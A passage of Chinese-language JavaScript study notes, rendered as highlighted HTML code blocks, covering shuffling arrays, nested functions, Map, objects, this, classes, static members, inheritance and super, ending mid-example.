+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> cards=[<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>];</span><br><span class="line"></span><br><span class="line">cards=<span class="title function_">shuffle</span>(cards);<span class="comment">//数组</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cards);<span class="comment">//每次运行都是打乱的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shuffle</span>(<span class="params">array</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> currentindex=array.<span class="property">length</span>;<span class="comment">//从最后一张开始洗牌</span></span><br><span class="line">    <span class="keyword">while</span>(currentindex!=<span class="number">0</span>)<span class="comment">//洗到第一张为止</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> randomindex=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*array.<span class="property">length</span>);</span><br><span class="line">        currentindex-=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> temp=array[currentindex];</span><br><span class="line">        array[currentindex]=array[randomindex];</span><br><span class="line">        array[randomindex]=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//=&gt;</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">xipai</span>=(<span class="params">array</span>)=&gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> currentindex=array.<span class="property">length</span>;<span class="comment">//从最后一张开始洗牌</span></span><br><span class="line">    <span class="keyword">while</span>(currentindex!=<span class="number">0</span>)<span class="comment">//洗到第一张为止</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> randomindex=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*array.<span class="property">length</span>);</span><br><span class="line">        currentindex-=<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">let</span> temp=array[currentindex];</span><br><span class="line">        array[currentindex]=array[randomindex];</span><br><span class="line">        array[randomindex]=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">xipai</span>(cards)); </span><br></pre></td></tr></table></figure>
+
+<p><strong>嵌套函数</strong></p>
+<p>外面的函数有权访问内在的函数</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//例1</span></span><br><span class="line"><span class="keyword">let</span> username=<span class="string">&quot;Yuleiyun&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> userno=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//showname();</span></span><br><span class="line"><span class="comment">//showno(); //这样我是无权访问内部函数了</span></span><br><span class="line"><span class="title function_">login</span>();<span class="comment">//所以要依靠外部函数去访问，可以理解为内在函数被保护了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_">showname</span>();</span><br><span class="line">    <span class="title function_">showno</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">showname</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`welcome! <span class="subst">$&#123;username&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showno</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`you have <span class="subst">$&#123;userno&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*function showname()&#123;</span></span><br><span class="line"><span class="comment">    console.log(`welcome! $&#123;username&#125;`);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">function showno()&#123;</span></span><br><span class="line"><span class="comment">    console.log(`you have $&#123;userno&#125;`);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>map 键值对</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> jiangjin=<span class="keyword">new</span> <span class="title class_">Map</span>([</span><br><span class="line">    [<span class="string">&quot;wo&quot;</span>,<span class="number">100</span>],</span><br><span class="line">    [<span class="string">&quot;ta&quot;</span>,<span class="number">200</span>],</span><br><span class="line">    [<span class="string">&quot;you&quot;</span>,<span class="number">300</span>]</span><br><span class="line">]);</span><br><span class="line">jiangjin.<span class="title function_">set</span>(<span class="string">&quot;he&quot;</span>,<span class="number">500</span>);<span class="comment">//添加</span></span><br><span class="line">jiangjin.<span class="title function_">delete</span>(<span class="string">&quot;he&quot;</span>);<span class="comment">//删除</span></span><br><span class="line">jiangjin.<span class="title function_">forEach</span>(<span class="function">(<span class="params">val,key</span>)=&gt;</span><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`name:<span class="subst">$&#123;key&#125;</span>,money:<span class="subst">$&#123;val&#125;</span>`</span>));</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">name:wo,money:100</span></span><br><span class="line"><span class="comment">name:ta,money:200</span></span><br><span class="line"><span class="comment">name:you,money:300</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(jiangjin.<span class="title function_">has</span>(<span class="string">&quot;ta&quot;</span>));<span class="comment">//true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(jiangjin.<span class="property">size</span>);<span class="comment">//3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> total=<span class="number">0</span>;</span><br><span class="line">total+=jiangjin.<span class="title function_">get</span>(<span class="string">&quot;wo&quot;</span>);<span class="comment">//获取奖金总数</span></span><br><span class="line">total+=jiangjin.<span class="title function_">get</span>(<span class="string">&quot;you&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(total);<span class="comment">//400</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>object</strong></p>
+<p>对象</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">属性：一个对象有什么</span></span><br><span class="line"><span class="comment">方法：一个对象能做什么</span></span><br><span class="line"><span class="comment">使用 . 去访问属性和方法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> person=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;Yuleiyun&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>:<span class="number">19</span>,</span><br><span class="line">    <span class="attr">color</span>:<span class="string">&quot;blue&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">eat</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;He&#x27;s Eatting!&quot;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">study</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;He&#x27;s studying!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">name</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">age</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">color</span>);</span><br><span class="line">person.<span class="title function_">eat</span>();</span><br><span class="line">person.<span class="title function_">study</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Yuleiyun</span></span><br><span class="line"><span class="comment">index.js:417 19</span></span><br><span class="line"><span class="comment">index.js:418 blue</span></span><br><span class="line"><span class="comment">index.js:410 He&#x27;s Eatting!</span></span><br><span class="line"><span class="comment">index.js:413 He&#x27;s studying!</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>this关键字</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> person1=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;Yuleiyun&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">eat</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">       <span class="comment">// console.log(`$&#123;name&#125; is Eatting!`); //读不到</span></span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is Eatting!`</span>); <span class="comment">//等价于 $&#123;person1.name&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> person2=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;asdasd&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">eat</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is Eatting!`</span>);<span class="comment">//等价于 $&#123;person2.name&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">person1.<span class="title function_">eat</span>();<span class="comment">//Yuleiyun is Eatting!</span></span><br><span class="line">person2.<span class="title function_">eat</span>();<span class="comment">//asdasd is Eatting!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//此外，它可以替换window对象的属性</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">name</span>=<span class="string">&quot;123213&quot;</span>;</span><br><span class="line"><span class="comment">//实质上是</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">name</span>=<span class="string">&quot;123213&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>classes</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 创建对象</span></span><br><span class="line"><span class="comment"> 定义对象的属性和方法</span></span><br><span class="line"><span class="comment"> 构造每一个特定的实例</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">    age=<span class="number">19</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;eat sth&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">study</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;study sth&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title function_">person</span>();</span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title function_">person</span>();</span><br><span class="line"><span class="keyword">const</span> p3=<span class="keyword">new</span> <span class="title function_">person</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">age</span>+<span class="number">1</span>);<span class="comment">//20</span></span><br><span class="line">p1.<span class="title function_">eat</span>();<span class="comment">//eat sth</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p2.<span class="property">age</span>+<span class="number">2</span>);<span class="comment">//21</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p3.<span class="property">age</span>+<span class="number">3</span>);<span class="comment">//22</span></span><br></pre></td></tr></table></figure>
+
+<p>classes与上面object的关系，如果仅仅是object，它会需要重新构造属性和方法；但是class，只需要一个模板即可，仅仅只是声明一个个实例即可访问</p>
+<p><strong>constructor</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//constructor</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">类的一种特殊方法，接受参数、分配属性</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">person</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,color</span>)&#123;<span class="comment">//就是constuctor，不可以自定义</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">color</span>=color;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">study</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is studying sth`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title function_">person</span>(<span class="string">&quot;Yu&quot;</span>,<span class="number">14</span>,<span class="string">&quot;blue&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">name</span>);<span class="comment">//Yu</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">age</span>);<span class="comment">//14</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">color</span>);<span class="comment">//blue</span></span><br><span class="line">p1.<span class="title function_">study</span>();<span class="comment">//Yu is studying sth</span></span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title function_">person</span>(<span class="string">&quot;Lei&quot;</span>,<span class="number">21</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p2.<span class="property">name</span>);<span class="comment">//Lei</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p2.<span class="property">age</span>);<span class="comment">//21</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p2.<span class="property">color</span>);<span class="comment">//red</span></span><br><span class="line">p2.<span class="title function_">study</span>();<span class="comment">//Lei is studying sth</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>static 关键字</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    numbers=<span class="number">0</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">numbers</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Yu&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Lei&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p3=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;sq&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//想要统计人的数量，应该是每创建一个，numbers就+1，</span></span><br><span class="line"><span class="comment">//但是呢，创建了三个，都是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1.<span class="property">numbers</span>);<span class="comment">//1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p2.<span class="property">numbers</span>);<span class="comment">//1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p3.<span class="property">numbers</span>);<span class="comment">//1</span></span><br><span class="line"><span class="comment">//因为每次numbers都是从0开始，而不是累加性质，所以要引入静态变量</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>static 属性</strong></p>
+<p>静态属性的话，偏向于缓存，统计</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> numbers=<span class="number">0</span>;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="title class_">Person</span>.<span class="property">numbers</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Yu&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Lei&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p3=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;sq&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property">numbers</span>);<span class="comment">//3</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>static 方法</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// start()&#123;</span></span><br><span class="line">    <span class="comment">//     console.log(&quot;here we go!&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">start</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;here we go!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> p1=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Yu&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p2=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Lei&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p3=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;sq&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// p1.start();</span></span><br><span class="line"><span class="comment">// p2.start();</span></span><br><span class="line"><span class="comment">// p3.start();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//我的本意是，跑步，三个人一起跑，而不是各跑各的</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="title function_">start</span>();<span class="comment">//here we go!</span></span><br></pre></td></tr></table></figure>
+
+<p>所以为什么，Math.rand()，而不是<code>const math=new Math();math.rand()</code>呢</p>
+<p>函数库都是静态方法，就是封装好了，直接调用，无法扩展，性能上好一点</p>
+<p><strong>继承，inheritance</strong></p>
+<p>子类与父类的这种，嗯，子类可以继承父类的公有成员和函数，解决一些类上面不必要的重复，公共的函数就直接用，也重写一下，还可以加自己的扩展函数</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//正常情况下：</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fish</span>&#123;</span><br><span class="line"></span><br><span class="line">    alive=<span class="literal">true</span>;</span><br><span class="line">    name=<span class="string">&quot;fish&quot;</span>;</span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is eating!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is sleeping!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">swim</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is swimming!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line"></span><br><span class="line">    alive=<span class="literal">true</span>;</span><br><span class="line">    name=<span class="string">&quot;dog&quot;</span>;</span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is eating!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is sleeping!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">run</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is running!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bird</span>&#123;</span><br><span class="line"></span><br><span class="line">    alive=<span class="literal">true</span>;</span><br><span class="line">    name=<span class="string">&quot;bird&quot;</span>;</span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is eating!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is sleeping!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">fly</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is flying!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下，三个类，<strong>Fish、Dog、Bird</strong>，它们有共同属性 <code>alive</code>，公共方法 <code>eat,sleep</code>，而且它们的都有共性是 <strong>Animal</strong>，所以</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">    alive=<span class="literal">true</span>;</span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is eating!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is sleeping!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fish</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">    name=<span class="string">&quot;fish&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">swim</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is swimming!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">    name=<span class="string">&quot;dog&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">run</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is running!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bird</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">    name=<span class="string">&quot;bird&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">fly</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is flying!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> fish=<span class="keyword">new</span> <span class="title class_">Fish</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fish.<span class="property">alive</span>);</span><br><span class="line">fish.<span class="title function_">eat</span>();</span><br><span class="line">fish.<span class="title function_">sleep</span>();</span><br><span class="line">fish.<span class="title function_">swim</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">true</span></span><br><span class="line"><span class="comment">fish is eating!</span></span><br><span class="line"><span class="comment">fish is sleeping!</span></span><br><span class="line"><span class="comment">fish is swimming!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> dog=<span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">dog.<span class="title function_">eat</span>();</span><br><span class="line">dog.<span class="title function_">sleep</span>();</span><br><span class="line">dog.<span class="title function_">swim</span>();<span class="comment">//报错</span></span><br><span class="line">dog.<span class="title function_">run</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">dog is eating!</span></span><br><span class="line"><span class="comment">dog is sleeping!</span></span><br><span class="line"><span class="comment">dog.swim is not a function</span></span><br><span class="line"><span class="comment">dog is running!</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> bird=<span class="keyword">new</span> <span class="title class_">Bird</span>();</span><br></pre></td></tr></table></figure>
+
+<p><strong>super</strong></p>
+<p>用于引用父类构造器的时候</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,runspeed</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">runspeed</span>=runspeed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fish</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span>&#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">name,age,swimspeed</span>)&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">age</span>=age;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">swimspeed</span>=swimspeed</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> dog=<span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;dog&quot;</span>,<span class="number">15</span>,<span class="number">40</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">name</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">age</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(dog.<span class="property">runspeed</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Must call super constructor </span></span><br><span class="line"><span class="comment">in derived class before accessing </span></span><br><span class="line"><span 